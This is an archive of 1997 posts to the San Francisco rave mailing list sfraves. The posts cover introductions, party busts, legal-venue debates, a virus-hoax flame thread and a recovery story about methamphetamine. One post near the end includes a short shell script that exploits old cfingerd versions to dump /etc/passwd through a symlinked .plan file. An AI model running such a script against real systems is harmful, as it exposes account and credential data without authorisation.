I started getting into the rave scene a few years ago to open my mind to
new types of music.
I really like techno, and music with fast beats and lots of tempo.  Most
of the places I have
been to on the East coast have been techno oriented.

I have started exploring the scene here and I love it.  Its more new
music to check out, which
is exciting. I saw dubtribe which totally got me grooving. I also went
to Eminence 97 which
was good and bad at the same time.  The one room with the big green
laser and the fast
tempo music was were I danced most of the time.

So thats the quick version, I really look forward to meeting you all.
I have been trying to make the monday night dinners, but i have been
stuck at the office.  I am going to try next week to
make it.

if anyone doesnt mind letting a newbie to the bay area tag along with
them, gimme a call
or send off some email! :)

peace out,
--
Bryan Schwab Application Engineer NetGravity, Inc.
415-655-4201 Pager:1-888-719-2949 Email: bschwab@netgravity.com

Hello Sfraves,

	I have finally moved and got my computer running again, so I can finally
give you guys the whole scoop. 

	Well, we planned to do this party in a small yet really cool space in
Oakland. The goal... to have a small party, where all of the Harmony crew
could just kick it and party with everyone, instead of slaving away for
days on end, and working the entire party. But according to the Oakland
Police Dept., we cannot do something like this. Appearently, the only way
that all of us can party and dance together after 2am is if we PAY OFF the
police. Our little world here has become so f**king currupt!!! I hate it!!!
Something has to give... soon. But I could go off on that forever, so I
won't. 

	To make a long story short, the space that we were going to use has been
busted and the Police warned that if we were to try it again, our party
too, would get busted, no matter how large or small. So basically, that
space was out. I looked for other spaces that would be suitable, but came
up with nothing, and in this short amount of time, I could not find any new
spaces either. So it was decided, that instead of giving you guys a half
ass party, in a space that we are not prepared to use, we are going to
postpone this party indefinatly. But when the time is right and the bad
emotions have been settled, we will all come together, and while dancing
all night, we will throw a f**king kick ass party, as one family!

	As far as the people who have already purchased their "Family" tickets. We
will honor our word. You can either mail the actual ticket with your full
return mailing address to the Harmony po box, or you can hold onto them
until the next party and use it as your ticket for that party. Whatever you
want to do is fine by us. If you mail your ticket to use, I personlly will
see to it that you get your money! We have not spent any of the money that
has come from the presold ticket sales, so everything is cool. Until next
time, keep smiling, and always, always keep the faith in our scene!!!

Peace, love and harmony to you,

Greg =)

Mark D. Camp wrote:
>
> HEY.  Sorry, but this is completly un-rave related.  So Delete it
NOW!!
>
> ok, if you're still with me, I've got a stupid WEB question to ask.
>
> What is the difference between a .com and .org URL???

.com signifies a Commerical organization, one that is in business to
make money

.org signifies a Non-Profit Organization, one that is in business to
provide a service and
    does not make money, other than to cover costs

ideally, if you are going to sell things over the net, or display what
your company can sell to
others, .com is needed. otherwise, .org is perfectly fine.

of course, i doubt anyone would be banging on your door if you were .org
and you were
selling products over the web. :)

--
Bryan Schwab Application Engineer NetGravity, Inc.
415-655-4201 Pager:1-888-719-2949 Email: bschwab@netgravity.com

On Fri, 3 Jan 1997, Nancy Shaw wrote:

> Being legit is not selling out.  It means we are taking care of - and 
> building - our community.  

	If building a community means paying for permits so we can water 
town hall's lawn, I kind of start cocking my eyebrows. If being legit 
means paying into the business we call government so I can play my sound 
system with people in a house that the occupants allow it, I my 
disenchantment with the line of "we are doing this to protect you from 
yourselves" grows. When the police tell me that I am responsible for all 
the people who come to a party, not the people themselves, I am just 
about ready to throw my hands up into the air in frustation - how are 
people supposed to take responsiblity for themselves if someone else is 
always having to do it.
	Selling out? I do not know where that comes into the picture
unless the promoter starts treating parties like a business (which one
would have to do really to go legit, I guess so maybe there is a link). I
just don't want throwing parties to HAVE to be a full time job because of
bullshit, plain and simple. I also do not want to have parties stop
because no one has the necessary finanical means to drop $4000 to rent a
club out in SF. That's a lot of money to drop for just about anyone I 
think. And then are you going to make any of it back?
	If people want to go legit, the space that Resolution happened in
is probably going to be coming up for rent soon and even for sale. It is a
good site and with $3000 dollars of sheet rock and lumber, a little more
fire permits, and a HELL of a lot of work, it could be a legal venue.
Anyone interested to put a fight together to maybe get a legal space
together? I have two arms to hang sheet rock with, carpentary skills to
build a deck and additional exits, anyone want to help Pascal buy the
place? 

dave

Yes, they are different since they use different root servers which are 
known as the coo root domain and the org root domain.

.com's are usually used by individuals or businesses for commercial 
purposes such as aol.com, microsoft.com, etc....  .orgs are normally used by 
non-profit organizations or groups such as cloudfactory.org, etc...  
Check out http://internic.net for more information about this.  


Peace,
Anthony E


PLUR = Phat Like Uncle Rupert  =]

> means paying into the business we call government so I can play my sound 
> system with people in a house that the occupants allow it, I my 
> disenchantment with the line of "we are doing this to protect you from 
> yourselves" grows. When the police tell me that I am responsible for all 
> the people who come to a party, not the people themselves, I am just

Well, since someone got someone started with these formal introductions I 
would like to formally introduce myself to the list.  I'm Anthony E, I'm 
Filipino with shaved head, about 5'4" tall.  I've been lurking in this 
list (well not really... i just really don't have time to post)  for 
about 6 months now.  I started going to raves about a year ago and my 
very first rave was at Los Angeles which was sorta like a massive and Ron 
D. Core was spinnin' an d everyone was shouting "HARDCORE!"  Anyway ever 
since that experience I started going to raves at least once every two 
weeks  (altho i've been going to raves every week lately).  I prefer 
small parties with a solid positive vibe where I can have fun and meet 
people.  

More about myself,  I am 19 years old and I run my own computer company 
and I am also a UNIX Security Administrator (yes kids, it's my 
responsibility to drive out those wily crackers off my site.)   In my 
part time during those boring weekdays I hang out on IRC and talk about 
anything that doesn't make sense on those "hacker" channels like #hack and 
#2600.   When I'm at raves I spend a lot of time walking around, meeting 
new people, and giving out candy (if some small filipino dude offers you 
starburst at a party it's probably me).  

There!  Now that that's off my back I hope to see you all at the 
Frequency-8 party this friday!  I have a bag full of starburst for everyone!
PLUR =]

Anthony E

From sfraves-owner@hyperreal.com  Wed Jan 15 18:13:44 1997

In-Reply-To: <Pine.APO.3.91.970115150550.13669C-100000@monsoon.berkeley.edu>

MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Sender: sfraves-owner@hyperreal.com
Precedence: bulk


I am not sure I was very clear in this message... Let me expand...

On Wed, 15 Jan 1997, Dave Bayer wrote:

> 	Selling out? I do not know where that comes into the picture
> unless the promoter starts treating parties like a business (which one
> would have to do really to go legit, I guess so maybe there is a link). I
> just don't want throwing parties to HAVE to be a full time job because of
> bullshit, plain and simple. I also do not want to have parties stop
> because no one has the necessary finanical means to drop $4000 to rent a
> club out in SF. That's a lot of money to drop for just about anyone I 
> think.

	It would be a clever ploy to take a community that is trying to 
deviate from capitalistic ways and convert it into a nice business which 
separates those throwing the party (the business people) from the people 
coming out to the party (the customers). By forcing promoters to obtain 
expensive permits, use "legal" sanctioned spaces, they provide much 
needed work and money for the local area. In a way, the system of 
approvals makes sure people keep adding to the economy in a nice way, by 
overlaying a customer/provider relationship on those coming out to the 
party (people will except more if you charge $15 to cover permit costs 
and so parties will take on a more commerical feel - why is there a 
difference between Martin's smaller Basics party and small UGs?). Now it 
could be argued that, in fact, the smaller parties are cheating the 
system, and greedy promoters are making millions or something along those 
lines, but look at the "greedy" promoters like Gateway, like the people 
who put Resolution on, like the guy who throw all his money into the 
space Resolution was held in, (those are the only promoters whose 
lifestyles I kind of know), are they greedy?
	What I see is a system which works a service provider/customer
overtone into every relationship when groups of people want to gather.  If
some people decide to go legit, they will be forced into charging more or
having to pay out of their pocket to pay for permits, for legal spaces (or
maintaining legal spaces). If they charge more, people feel like customers
which was one of the things that raves used to lack (some semblence of
trust between promoter and partygoer that most money was going toward keep
things going or free parties and not into promoters pockets for living a
lavish lifestyle, maybe that was always bullshit and people were getting
rich and living lavish lifestyles, I dunno). It will take work by all of
the "community" to override this pressure from the "state". That line
about the permit issuing type trying to tell us that they don't want
people getting together in a nonbusiness environment kind of top of this
drivel that had been going through my head before... 

dave

Good Day SF Raves!!
So good to see that there is still posativeity, loveliness, and good 
people out there.  This is my intro, my short history, and my phylosophy.

First off -I am a product of the word proccessing generation so please 
don't hold my atrocious spelling against me.

I am Spencer K., the last name is Knowles but I like to think of myself 
as an individual all my own with ideals, beliefs, and a life seperate 
from the Knowles clan.  Its not than I am ashmed or anything of my clan 
just that Spencer is me, who I am, I can develope and mold Spencer into 
what I want, Knowles is a preconcieved ideal that shatters my 
individuality and anchors me to one clan, one group, one family.  I like 
to think of everyone as members of one family, and so I like to think of 
myself as Spencer, ya know, just one of the family.
     I hark from accross the great devide of the california/Oregon 
boarder.  A small ski town known as Bend, Oregon was my stating point for 
the adventure of life. After high school and the endless dramas therin I 
moved to LA to seek my fortune in FILM.  I ended up working on streight 
to videao masterpieces such as "Capt'n Nuke and The Bomber Boys" and 
"Carniusour III", as  tempting as this life was I left it for college.  
After three years and a few bumps, ruts, storms, and joys, I had attened 4 
colleges and lived in three states, this period of Spencer's history is 
extremely complex but interesting and I would be thrilled to discuss it 
with you sometime at a party but this is not the place.  Anyway, I grew 
confused, angry, negative, and hopeless with the tormenteing human 
race.  So with a sleeping back under my arm and c-note in the bank I 
moved to Maui to 
clear my mind and meditate on life.  Long story sort- Boy gives up on 
society, boy moves to Island paradise, boy clears mind, finds purpose and 
falls in love with a kitten with a wip, namely LIFE. I decided to 
fill my 
head with something rather than cocconuts and salt water so I am now 
attending UC Santa Cruz, ya know, getting smart like.  My first rave was 
at the Dance Studio, I met the most posative, enlighteded, and grounded 
people I have ever known there and have been hooked ever since.  I am 
attracted to the sociality, community, love, and just plain fuzzy feeling 
I get with the rave community, you guys are the best. 
     I am looking forward to putting on my own parties and spreading this 
beautiful vibe!  if anyone ever needs a hand just ask me.  /so I suppose 
I should finish this crazyt thing so here goes.  I am 20 years since 
birth,  
white (caucasion for the politicaly correct),  6' 3" and have very 
large, blong, curly hair, its more like a thicket than hair.  Just look 
for someone who might have had the nick name "Fro Daddy Jones".
     I accaisionally sell glow necklaces and other beautifully charged 
play toys at parties but I am not good at charging money for fun stuff so 
sometimes I sell but most of the times I give them away, it all depends on if I 
have food in the pantry or not.  
     So there I am in a nutshel, a very small, low capasity nut shell.  
There is so much more, guess you'll just have to meet me to find out.  I 
can't wait to meet all of you and hear your stories.  So with a hug and a 
smile I say good day and hello.

Spencer K.
  
P.S. - Massives are ussually not my dish-de-light but I'll be going 
bonkers at Acid Breaks on saturday so look for my green neon backpack, my 
hughe hair, and the guy with a couple hundred glow necklacs about him, 
that's me, I'll reply with a hug and a good day!! see ya soon SF Raves!!

P.P.S- Mail me back,  Conversation is the medium of growth - Love is the 
medium of life.

> Date: Wed, 15 Jan 1997 17:43:25 -0800 (PST)
> From: Anthony Eufemio <tymat@community.net>
> cc: "\\SFRaves\\" <sfraves@hyperreal.com>

> Has anyone ever considered throwing more parties somewhere not near the 
> city?  What are the policies/laws in other cities?  This idea came to my 
> mind after NYE when the only party that wasn't busted was the Cloud 
> Factory party at Monterey.  Maybe we should start having parties 
> somewhere other than Oakland or San Francisco.... A long drive is well 
> worth it if we could stay and party till morning.

The issue to me is more than "How far do I have to drive tonight?". It
has to do with perserving an important aspect of the culture in San
Francisco. What will happen when the Law finally drives out all of
the artists and musicians in the city?

We can move to another city, but remember that "rave" is a dirty word
as far as the media is concerned. It's only a matter of time before we
would be forced out of the next town.

Steve

ps. please join the discussion! sfr-legal@saturn5.com
send the line "subscribe" to the address sfr-legal-request@saturn5.com

 I really don't see why anyone would worry/care about some little virus
floating around on the internet.
  You have total control over what you do w/ your computer.
 If you want to risk having to reformat your HDD by downloading an
executable file and double clicking on it. You can do that.. No problem.
 If you want make your computer the perfect virus fighting android and gate
master to your chunk of the super highway. Go for it!   Whats stopping you?

   I am sure though..  That we will all be very amazed w/ the future of
computer viruses.    With all this artifitial intelligence n all.  
Programs that adapt, learn from mistakes.  
   What about them programs that reproduce. Actually, spread like bacteria,
chowing down on files to make copies of them selves. How would you like
that? Your hard drive just filled /w a bunch of combinded possitive and
negetive electrons looking for more food....

 With this terrible reality infront of us. I think it is ok to send funny
(totally harmless according to most of the laws of phisics) E-mail to your
friends! Damnit!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Jeff

Subject: Hello, Sf Raves...(Intro)

Hello to SF Raves from the both of us.  Yes, there are two of us sharing
the same e-mail address so when we post you'll see the message either from
danielv or from elina.  We are a happy but broke most of the time, couple
that live here in the ugly, miserable, stinky Salinas Valley.  Where the
word "rave" is almost oblique.  Daniel is 25 and DJ's wherever he can, and
is very loyal and dedicated to the scene.  He makes me happy with the vibe
he trancends with his music, and I'm sure he'd make you happy too, if you
SFr's ever gave him a chance. Someday, people...someday.  He's pretty
experienced, he's been spinning since he was thirteen years old.  He makes
his living working full time at a TV station (KCBA/KCCN) as an AVID editor.
He has alot of experience producing, shooting, and editing.  So if anyone
ever needs anything, hit him up, he's good!  He is a very kindhearted man,
he's a gentle bear, my bear (mush).  As for me, I'm 23, and a full time
student at the community college here in Salinas.  I am studying Computer
Science/Multimedia. We both love going to good raves, with good vibes, and
hardcore music that just raptures your body. Cloud Factory definately gave
our New Year a sweet start!  We try to stay very connected with fellow
ravers and those who share like interests because we need that fulfillment
living here in such a desolate, deprived town.  So we try to get fed as
much as we can, and Daniel keeps current with his record buying.  I have to
admit, I love supporting his habit, and backing him up 100%, because he
backs my education up 100%.  I guess we make a very good team as soulmates,
but also as a family, because life for us is not all about ravin', work and
school, but it's also about our #1 priority, our pride and joy....Our three
year old sun, Andrew.  I spell son, s-u-n, because he is like the sunshine
in our life.  He is beautiful, he is so full of love and happiness, because
he has both of us.  We are bringing him up in rave culture, and have lots
of future hopes for him to contribute to this secondary culture.  Hopefully
in music, but whatever he wants is fine.  Last but not least, we snowboard.
We just got back actually from an amazing adventure in Tahoe, and we're
not satisfied with just a weekend.  We are planning to go back, because we
had so much fun this weekend, and Tahoe got fresh powder....Yum!!! So as
you can see, we have a very full life, with lots of responsibilities.  But
what it's all about people, is having a balance of all things, that makes
life worth living.  Sorry so long, but it's from both of us.  Thanks
everyone, for just being there, and hopefully we'll move out of this
shithole and closer to you. Peace and Hugs, Daniel and Elina :)

Well, hi!
  My first rave was in September of 96, but I've only recently grown really
addicted to the scene. =)  Unluckily for me, I made a recent move back to
Kentucky for family & education and so I suffer through bouts of GoodVibe
Withdrawl...  But, I do visit the bay area at least once or twice a month. (In
fact, my car stays there permanently.)
 Basically my story goes: Lil'Berrie grew up shy & conservative in a very
constructed atmosphere in the bay area, 16 y/o Berrie & family moved away to
rural Kentucky, 18 y/o Berrie moved OUT and back to the bay-consequently going
somewhat crazy, then 1997 brought me a little insight into priorities.  And
now, I have plans to move back somewhere between one half a year to two years.
(smarter, prepared-er, richer)

Patience is a virtue. =D    <:wait:>


 *plur* & <:HUGS:>!!!

For any of you confused about the GaiaMind postings, I wanted to 
 clarify that there's two events in San Francisco posted to sfraves.  
 Acutally, there are five events just in SF alone, but two that 
 integrates house/trance/tribal music, dance, and the arts.  
 Celebrating unity consciousness in conjunction with a particular 
 planetary alignment that last occured around the renaissance period, 
 GaiaMind is a grassroots opportunity for personal and planetary 
 healing.  If you're interested in the concept, the related campaign, 
 and links to this event, I suggest you look at the web page: 
 http://www.gaiamind.com.  Their e-mail addy is: info@gaiamind.com, 
 415,436.0123.

The Evolution Collective is doing a meditation/prayer/dance/interactive 
 arts event from 9am-1pm on Thursday, 1/23/97 at St. John's in the 
 Mission (see address and info below).  And
Ran and another sfraver posted the evening event which will be pretty 
 incredible in it's own right as a benefit for Headwaters Forest.  I've 
 listed both events below since they complement each other and we're 
 supporting/sharing some resources in the spirit of 
 cooperation...something I'd like to see more of in this scene ;}

Hope to see some of you there!

Hugs,
Diane
----------

EVOLUTION: A Celebration of Life
Thursday January 23, 1997
Dreamspell Calendar: Yellow Electric Sun

9 am - 1 pm @ St. John the Evangelist Episcopal Church
1661-15th St. @ Julian Ave between Guerrero and Valencia

The Evolution Collective in association with the GaiaMind Project presents
a free San Francisco gathering for the GaiaMind Global Meditation and Prayer.
Evolution gatherings are a forum for relation, creation, and manifestation
integrating ritual, music, and movement.

Opening our doors at 9 am, the actual group meditation will start at 9:30am.
Afterwards, we'll move into a ceremony and dancing with DJ Dante and Marcus
Hawkins on electric violin.  There will be a microphone hooked into the 
 mix board
 if you'd like to alternate w/Marcus and others contributing to the mix 
 w/the dj.
The celebration ends with a closing meditation at 12:56pm as the astrological
conjunction perfects over San Francisco.  Several other art/dance/house
communities in the United States will synchronize with us in this 
 closing meditation
building an even stronger vibe often shared in the common groove found 
 through music
and dance.

Bring musical instruments, drums, food, contributions to the collective
altar, and anything else you would like to share.

If you would like to contribute to the realization of this goal or need
more info, call the Evolution Info line:  415.908.6717
-----------------------
Here's the evening event:
----------------------------------
GAIAMIND Global Meditation and Prayer
& Benefit for Headwaters Forest
January 23, 1997

Ritual Meditation, Global Internet Synchronization

DJs:				Live Bands:
IVO (Shriyantra)			Galactic Dreamspell
NEIL (CCC)			Ambient Temple of Imagination
THETA BLIP (Psycho Disko)	Andiamo
GRAHAM (Edin)			Liquid Acrobat
ABSTRACT (Bass Kru)		Haunted by Waters
FLUX (Bass Kru)	
GABE REAL
VAJRA

$7

Visuals by D-7, Peter Booth Lee
(415) 789-7673
www.cea.edu/foster

Message-ID: <Pine.BSI.3.95.970115205154.18989B-100000@value.net>

Dear All;

	Wow, your priorities in life suddenly change from getting back
on-line, to recovering your $13k baby from the evil and dreaded; by every
car owning Californian; City Tow. Yes folks; the evil bastards; & bitches
to be fair illegally impounded my car. Why you ask; I happened to have
rolled a flashing light; a right turn at that; @ 3am, and got Darth Vader
and Attilla the hun for peace officers. In addition to the lame red light
charge, I didn't happen to have my legal & valid out of state license on
me, and since it's up to the discretion of the officer they decided to
impound my vehicle. Just goes to show ya misery loves
company/companionship. On top of that to find out that the evil overload; 
City Tow, will sell your car for a fraction of it's worth just to cover
the bogus towing and storage charges giving the rightful owner a return
investment of; shall we say $0.00, was the main determining factor in my
delay to return to all my brothers and sisters on-line. 

	But the good news folks is that the DarknEs^2 has got the big guns
out on dis one(legal council from Frank Rosen Esq,/LA), and provided that
the evil & dreaded even still methaphedamine monster does resurface, god
willing(no I haven't gotten religious in my absents; god = good old
druggies) I will recover said vehicle after shelling out lots o $$$ by the
latest 2/3/97, if not sooner, and cheaper. 

	But the real news here folks is that dis raver is 11 painfully,
yet glorious days sober, not even weed. Let's just say, and very seriously
at that, that dis raver decided yet one more time to do battle with the
dreaded meth monster, and it almost took my mind (then some of you already
think I'm crazy; HA HA you should have seen me at Alta Bates Psych
Hospital, ask Peter Fogel, who I give permission to state his professional
& clinical observations of myself while I was at Alta Bates in an effort
to help bring awareness to you all about the dangers of methaphedamine
addiction). A mind that has stuff on the Discovery Space Shuttle, not to
mentioned assisting in putting Rapid Transist systems like BART, on-line
in over 5 major US cites including my project NYC, NY Metro-North, LIRR
rebuild/retrofit.

	But the even greater news is what I've discovered when I came back
from being so far out there, and how I feel now after just 11 days of zero
substance intake, less caffiene. Empowered, confident, driven, impassioned
about life on life's terms, emotional, vibrant, powerful, tactile, aware,
creative, expressive, spiritual, let's just say RESONANT. I feel my
spirit, not your spirit or thee spirit; MY SPIRIT more so now than at any
other point in my life, and it's wonderful, beyond words and feelings.

	You can see it in the way I walk(@ 5mph), when you look into my
eyes(not red, just clear white & emeral green) or so they tell me. That
there's a purpose, a clarity, & a calmness where there was chaos and
intolerable nervous energy before.

	Reality, has a feel to it, it's like I'm swimming in ether; and
it's wonderful, exciting and a worth-wild pursuit just on it's own merits;
without all the additives. I guess it took being out there for so long to
become aware of what's really there, or at least what I sense is there.

	Don't get me wrong, there are nights I struggle and cry myself to
sleep over an insane desire to do that chemical(which I can say to you is
better than sex, but not real), despite the way I feel now as I'm
communicating this to you; despite all my intelligence and all the self
knowledge I have about it and what it will do to me; despite everything
that's at stake(my car, my body & mind, and everyone that I love), that
there are times that I would give it all up in a second for a shot of
glass. 

	I'm so lucky to be a live and I know it, I'm so lucky not to have
HIV, or the other awful diseases associated with the use of IV drug use. 

	Ya know I'm hopelessly liberal, and believe down to my core that
everyone should try each and every substance there is and make a decision
for THEMSELVES; it so moved to. But when it comes to this substance, I as
a live & let live liberal, am so torn that it makes me question what I
believe in and advocate, to the point of almost saying that it's every
person's job on our scene to end production of and destory this chemical
forever. One not one person I have ever spoken to, who has done it, and
been through it, has said to me; Brian I really benefited from the use of
illegally produced methaphedamine; NOT ONE. 

	Well, you know how I feel and how I'm doing, and I will be back
soon. I'd like to thank Kevin Keiper for letting me use his account to
rant, rave, and express my joys, feelings, & concerns, Please do not send
him hate mail, if you need to respond to me, call 800-590-4993, and you
will find instructions there on how to send me internet e-mail via my
alpha pager;  please keep'em short I only have a 4x4 LCD display. 

Love 
Brian 
xoxoxxoxoxxoxoxo

ps I'll be with you soon, if you have a burning desire to give me a hug,
you will find me at 362 Capp Street, in the Mission every night at 10pm in
the NA meeting there.

pss I will personally hunt down the little shit who subscribes my alpha
pager to sfraves, and after I'm through torturing them I will force them
to show me how they did it, : )

	
	to feel so much
	to let somebody touch you
	so hot 
	so cold
	so far so outta control
	were hard to come by
	even harder to hold

party wherever it is.  Each car having its maximum capacity of PLUR
practicing ravers.  I'm getting a car by mid February and I'll definately
give _FREE_ rides to anyone who wants to go to the party I am going to...
it's a way to show my appreciation for the love and the warmth that everyone
in this family has shared to me.  In the meantime people can post to this
list and ask for a ride.  I'm pretty sure someone will respond if you ask
ahead of time.  I have tried this technique a few times and I've also made
new friends as a result.....

Hang on there,  if we stick together as the family we're supposed to be
nothing can take us down.

have yet to see the Good Times Virus hoax (which I've seen 3 or 4 times 
in circulation) treated in a satirical way. And I get folks who foward 
humor to me all the time. (sigh) Guess I'm just not with it.



> >> the good times virus is a hoax.

 I don't see your support for this claim AT ALL BUDDY.

 REPEAT: This is NOT the Good Times Virus hoax. It is HUMOR and a 
satirical poke at said hoax.


> Something real could come along, and like the boy who cried wolf, none of
> us would believe it. I don't manage this list, but IMO this stuff doesn't
> belong here.

 Your opinion would matter so much more if you knew what you were talking 
about.


 I really can't believe the amount of people (well 3 or 4 maybe) that 
think I was fowarding the Good Times hoax when I was actually fowarding 
some humor based upon said hoax. Please read your email before just 
firing off a response. It saves a lot of bandwidth.

 Just as an aside; I have been guilty of fowarding hoax virus's until I was 
clued in to them. I was also guilty of "reactionary" emailing (and 
unfortunately sometimes still do) to people trolling (like JSL) for 
responses. It has taken me a while to learn not to go into auto-respond 
mode when sent email I don't like. I'm still not perfect at this but I do 
feel like I'm getting better at it.

 The point here is to learn from your (our) experiences. I have fired off 
a few hasty mails in relation to this post, to people whom I felt were 
attacking me for this post. I especially didn't like the folks who 
attacked me publicly. If I post something you don't like, it is more 
polite (IMO) to do a private email to discuss the issue.

 I am open to discussion on these issues but this thread should probably 
go off-list at this point.


Peace,

Subject: [NRR] Good Times virus
Sender: sfraves-owner@hyperreal.com
Precedence: bulk

Well, this thing has been around ever since e-mail existed.  There is a
paper on this at CIAC (a computer security advisory).  Check our the page at
http://ciac.llnl.gov  I think CERT also has something on this.  Obviously
this is a hoax.  The only way to transmit a virus is by running a binary
executable which has been infected on your local site along with the new MS
Office line of viruses which basically transported thru a document file and
when this is opened by a program like MS Word it will attach hidden
metacharacters to MS Word and every MS Word document you create or open from
then on will be infected sometimes causing really weird things to happen
like general protection faults etc...  Enough geektalk for now.

PLUR =],
Anthony E

--------------------------------------cut
here----------------------------------------
#!/bin/sh
# Elite code to obtain shadowed password file on UNIX running vulnerable
versions of
# cfingerd.  Contact your system administrator if this works on your site!
# For educational purposes only.  
#
# by: Anthony E (tymat@community.net)
#

USERNAME=foo 
# change foo to your login name (e.g. tymat)

ln -s /etc/passwd ~/.plan
finger $USERNAME > ~/etc.passwd
----------------------------------------------------------------------------
-----------

Uh, okay... I really dislike getting into these flame wars. I guess I might
have came off too serious (agin), but yanno, that's life. Maybe we are just
out of sync? Our feeble attempts at humor are not making it across the
wire, for some reason? ;) *HUG* Some of what you say in here, is getting a
little personal. I don't remember making any judgements on you as an
individual, Randy. Maybe I'm reading this wrong, but some of this hurts. I
have already met a buncha nice folks on this list and I was really starting
to enjoy it. I hope this isn't going to be a problem, my friend. *HUG*

As a somewhat related post, I am going to be following this up with
something interesting "about friendship"...

John S. Lee wrote:
> At 8:44 PM -0800 1/15/97, Sharif Torpis wrote:
> >
> >puhleeze...
> >
> >> For all you ravers who continue to use the term gangstah to identify, er,
> >> attitidue, you might want to check this site [http://gangid.ucdavis.edu/]
> >> out.  It pretty much says it
> >
> >nope, we all know what we mean ... gangstas ... no confusion here ...
> >
>
> [snip]...Are you fostering conversation, as I think the web page does, or are you
> just being antagonistic? Benn done by better.


OK.  I've been listening to this one for a while without saying 
anything, and now I've got a comment to make.  I checked out that
web page, meaning I actuallyl *read* it with an *open* mind.
I found it educational as it separated fashion from gangsta
affiliation.

I think I know where John's going with his feelings on "gangsta", 
and while I'm quite sure none of us intends a racial spin on the 
word, that seems to be the way it is construed by a handful of 
people on this list.  So, how about this:

"Toughguy".  As in, "the rave sucked because there were too many
toughguys hanging out, creating a negative vibe with their 'don't
even look at me, punk' attitudes."  

I suggest this because that's what I mean when I refer to the 
gangstas.  Folks in clothing that makes them look like their 
ideal of "hard" and "mean", assuming the "this is my space" 
pose and facial expressions, etc.  

We all know the type, and it isn't governed by color lines.  I've
seen plenty of every shade of brown hitting the 
down-with-my-homies stance and glaring at the more colorful
rave kiddies.

So since we're a family, and since some members of our family
are offended by the term, I myself will voluntarily try to 
reform my vocabulary.  

It's not a defeat, it's a loving compromise.

peace out from the Tally wigga,

S

From: NUB Circus <nubchai@cruzio.com>
Reply-To: nubchai@cruzio.com
X-Mailer: Mozilla 2.0 (Macintosh; I; PPC)
MIME-Version: 1.0
To: sfraves@hyperreal.com
Subject: Chai at massives! (a call out for feedback)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Sender: sfraves-owner@hyperreal.com
Precedence: bulk

Yes, it is time for Chai to break more into the mainstream.  

We have been serving NUB Chai for many months at small underground 
parties.  Many requests have come in from party-goers and promoters 
wanting us to brew the elixir at their massives (a term I take to mean 
larger, more mainstream, "raves").

The time is a upon us; a NUB team has been recruited and selected, more 
percolators and inventory have been stocked.  We originally planned to 
do this as a regular weekly, or even 3 nights a week, endeavor beginning 
in early February.  The preparations have already been made and we see 
no reason to wait any longer.  

The person spearheading this project has been looking at either the 
Origin or AcidBreaks parties for this weekend... but I do not know too 
much about either.  How large are these parties, what is the vibe/ 
histories of the promoters, and how would I go about making contact so 
that the NUB sattelite crew could make it somewhere worthwhile this 
weekend!

Feedback and comments welcomed...

Nate
NUB Circus

	Remember:  Generalizations are only GENERALLY true.
		
	An exception to a generalization does NOT negate the
	validity of the generalization.  If I say "Tigers do not make
	good pets" and you say "You're wrong!  I have a tiger and
	it's a wonderful pet!".  That still doesn't mean I'm wrong!
	Tigers IN GENERAL do not make good pets.....

Mime-Version: 1.0
